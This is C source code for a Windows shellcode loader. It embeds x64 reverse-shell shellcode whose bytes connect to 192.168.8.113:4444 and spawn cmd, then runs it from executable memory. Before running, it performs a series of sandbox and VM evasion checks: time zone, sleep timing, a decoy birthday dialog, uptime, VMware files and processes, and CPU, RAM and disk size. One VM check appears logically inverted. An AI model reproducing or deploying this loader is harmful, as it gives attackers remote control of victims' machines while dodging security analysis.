﻿#include <Windows.h>
#include <Tlhelp32.h>
#include <Strsafe.h>
#include <Timezoneapi.h>

#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"")

int main()
{
	const char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00"
"\x49\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x08\x71\x41\x54"
"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c"
"\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff"
"\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2"
"\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48"
"\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99"
"\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x49\xb8\x63"
"\x6d\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50\x48\x89\xe2\x57"
"\x57\x57\x4d\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44"
"\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6"
"\x56\x50\x41\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff"
"\xc8\x4d\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5"
"\x48\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48"
"\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
"\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";
PVOID shellcode_exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
RtlCopyMemory(shellcode_exec, shellcode, sizeof shellcode);
DWORD threadID;

//time zone
SetThreadLocale(MAKELCID(MAKELANGID(LANG_ENGLISH, SUBLANG_ENGLISH_US), SORT_DEFAULT));
DYNAMIC_TIME_ZONE_INFORMATION TimeZoneInfo;
GetDynamicTimeZoneInformation(&TimeZoneInfo);
wchar_t TimeZone[128 + 1];
StringCchCopyW(TimeZone, 128, TimeZoneInfo.TimeZoneKeyName);
CharUpperW(TimeZone);
if (!wcsstr(TimeZone, L"CENTRAL EUROPEAN STANDARD TIME")) return false;



//delay exec
ULONGLONG BeforeSleep = GetTickCount64();
typedef NTSTATUS(WINAPI* PNtDelayExecution)(IN BOOLEAN, IN PLARGE_INTEGER);
PNtDelayExecution pNtDelayExecution = (PNtDelayExecution)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtDelayExecution");
LARGE_INTEGER delay;
delay.QuadPart = -10000 * 100000; // 100 seconds
pNtDelayExecution(FALSE, &delay);
ULONGLONG AfterSleep = GetTickCount64();
if ((AfterSleep - BeforeSleep) < 100000) return false;

//gui
int response = MessageBoxW(NULL, L"Today is your birthday?\nHappy birthday to you!", L"Hello", MB_ICONQUESTION | MB_YESNOCANCEL | MB_DEFBUTTON1);
if (response == IDYES) return false;

 // run time
ULONGLONG starttime = GetTickCount64() / 1000;
if (starttime < 1800) return false;

// check vm file
WIN32_FIND_DATAW VMfile;
if (FindFirstFileW(L"C:\\Windows\\System32\\drivers\\vm*.sys", &VMfile) != INVALID_HANDLE_VALUE) return false;

// check vm dir
wchar_t currentProcessPath[MAX_PATH];
GetModuleFileNameW(NULL, currentProcessPath, MAX_PATH);
CharUpperW(currentProcessPath);
if (!wcsstr(currentProcessPath, L"C:\\PROGRAM FILES\\VMWARE\\")) return false;



// Run process
PROCESSENTRY32W ProcessEntry = { 0 };
ProcessEntry.dwSize = sizeof(PROCESSENTRY32W);
HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
WCHAR ProcessName[MAX_PATH];
if (Process32FirstW(hSnapshot, &ProcessEntry))
{
	do
	{
		StringCchCopyW(ProcessName, MAX_PATH, ProcessEntry.szExeFile);
		CharUpperW(ProcessName);
		if (wcsstr(ProcessName, L"VMTOOLSD.EXE")) exit(0);
	} while (Process32NextW(hSnapshot, &ProcessEntry));
}


// check CPU
SYSTEM_INFO systeminfo;
GetSystemInfo(&systeminfo);
DWORD NumberOfProcessors = systeminfo.dwNumberOfProcessors;
if (NumberOfProcessors < 2) return false;

// check RAM
MEMORYSTATUSEX memorystatus;
memorystatus.dwLength = sizeof(memorystatus);
GlobalMemoryStatusEx(&memorystatus);
DWORD RAMMB = memorystatus.ullTotalPhys / 1024 / 1024;
if (RAMMB < 2048) return false;

// check HDD
HANDLE Device = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
DISK_GEOMETRY DiskGeometry;
DWORD bytesReturned;
DeviceIoControl(Device, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &DiskGeometry, sizeof(DiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
DWORD DiskSizeGB;
DiskSizeGB = DiskGeometry.Cylinders.QuadPart * (ULONG)DiskGeometry.TracksPerCylinder * (ULONG)DiskGeometry.SectorsPerTrack * (ULONG)DiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
if (DiskSizeGB < 50) return false;

HANDLE Thread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
WaitForSingleObject(Thread, INFINITE);
}